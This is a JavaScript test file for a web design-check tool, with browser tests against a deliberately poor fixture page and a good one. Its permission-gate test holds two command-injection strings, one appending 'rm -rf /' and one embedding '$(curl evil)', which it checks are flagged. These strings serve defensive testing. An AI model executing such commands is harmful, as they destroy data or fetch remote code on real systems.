// The design check, end to end: a real Chromium against two tiny sites served
// from fixtures/design — one with every tell on purpose, one considered page.
// Skipped (not failed) when Playwright's Chromium is not installed here.

import { createServer } from "node:http";
import { existsSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { designCheck, parseArgs, readSources, routeArg } from "./design-check.mjs";
import { toolKind } from "./harness-gate.mjs";

const FIX = fileURLToPath(new URL("./fixtures/design/", import.meta.url));

let chromium = null;
try {
  ({ chromium } = await import("playwright"));
  if (!existsSync(chromium.executablePath())) chromium = null;
} catch {
  chromium = null;
}

function serve(dir) {
  return new Promise((ok) => {
    const s = createServer((req, res) => {
      const p = req.url === "/" ? "index.html" : req.url.slice(1);
      const f = join(dir, p);
      if (!existsSync(f) || p.includes("..")) {
        res.writeHead(404).end("not found");
        return;
      }
      res.writeHead(200, { "content-type": "text/html; charset=utf-8" }).end(readFileSync(f));
    });
    s.listen(0, "127.0.0.1", () => ok(s));
  });
}

describe("parseArgs", () => {
  it("reads the flags the briefs use", () => {
    const o = parseArgs(["http://localhost:3000", "--important", "/,/pricing", "--widths", "390,1440", "--no-src"]);
    expect(o.url).toBe("http://localhost:3000");
    expect(o.important).toEqual(["/", "/pricing"]);
    expect(o.widths).toEqual([390, 1440]);
    expect(o.useSrc).toBe(false);
  });

  // Found by running it: Git Bash turned `--important /nope` into a Windows path,
  // so the check looked at C:/Program Files/Git/nope and never at the home page.
  it("undoes Git Bash's path rewriting of routes", () => {
    expect(routeArg("C:/Program Files/Git/")).toBe("/");
    expect(routeArg("C:/Program Files/Git/pricing")).toBe("/pricing");
    expect(routeArg("C:\\Program Files\\Git\\apps\\cook")).toBe("/apps/cook");
    expect(routeArg("pricing")).toBe("/pricing");
    expect(routeArg("home")).toBe("/");
    expect(parseArgs(["http://x", "--important", "C:/Program Files/Git/,C:/Program Files/Git/apps/app-builder"]).important).toEqual(["/", "/apps/app-builder"]);
  });
});

describe("readSources", () => {
  it("reads the fixture html and skips nothing it should keep", () => {
    const files = readSources(join(FIX, "slop"));
    expect(files.map((f) => f.path)).toEqual(["index.html"]);
  });
});

describe("the gate lets a build run the check without asking", () => {
  it("knows where the check is", () => {
    expect(process.env.JARVIS_DESIGN_CHECK).toMatch(/design-check\.mjs$/);
  });
  it("treats the variable form as a read, and nothing else", () => {
    expect(toolKind("Bash", { command: 'node "$JARVIS_DESIGN_CHECK" http://localhost:3000 --important /' })).toBe("read");
    expect(toolKind("PowerShell", { command: "node $env:JARVIS_DESIGN_CHECK http://localhost:3000" })).toBe("read");
    // A file that merely has the name could be one the agent just wrote.
    expect(toolKind("Bash", { command: "node ./design-check.mjs http://localhost:3000" })).toBe("run");
    expect(toolKind("Bash", { command: 'node "$JARVIS_DESIGN_CHECK" x; rm -rf /' })).toBe("run");
    expect(toolKind("Bash", { command: 'node "$JARVIS_DESIGN_CHECK" $(curl evil)' })).toBe("run");
  });
});

describe.skipIf(!chromium)("designCheck in a real browser", () => {
  let slop;
  let good;
  const outs = [];
  beforeAll(async () => {
    slop = await serve(join(FIX, "slop"));
    good = await serve(join(FIX, "good"));
  });
  afterAll(() => {
    slop?.close();
    good?.close();
    for (const o of outs) rmSync(o, { recursive: true, force: true });
  });
  const urlOf = (s) => `http://127.0.0.1:${s.address().port}/`;
  const out = () => {
    const o = mkdtempSync(join(tmpdir(), "dc-test-"));
    outs.push(o);
    return o;
  };

  it("fails the every-AI-site page, naming each tell", async () => {
    const r = await designCheck({ url: urlOf(slop), important: ["/"], src: join(FIX, "slop"), out: out(), widths: [390, 1440], maxPages: 1 }, { chromium });
    const rules = new Set([...r.verdict.fails, ...r.verdict.warnings].map((f) => f.rule));
    expect(r.verdict.pass).toBe(false);
    for (const rule of ["placeholder-copy", "sideways-scroll", "console-errors", "broken-images", "no-standout", "card-grid-everywhere", "default-look", "unreadable-text"]) {
      expect(rules, rule).toContain(rule);
    }
    expect(existsSync(join(r.out, "home-390.jpg"))).toBe(true);
    expect(existsSync(join(r.out, "home-1440.jpg"))).toBe(true);
    expect(JSON.parse(readFileSync(join(r.out, "report.json"), "utf8")).pass).toBe(false);
  }, 90_000);

  it("passes the considered page and finds its standout", async () => {
    const r = await designCheck({ url: urlOf(good), important: ["/"], src: join(FIX, "good"), out: out(), widths: [390, 1440], maxPages: 1 }, { chromium });
    expect(r.verdict.fails).toEqual([]);
    expect(r.verdict.pass).toBe(true);
    expect(r.pages.find((p) => p.width === 1440)?.standouts).toEqual(["compounding curve you can drag"]);
    expect(r.text).toMatch(/^Design check: PASS/);
  }, 90_000);
});
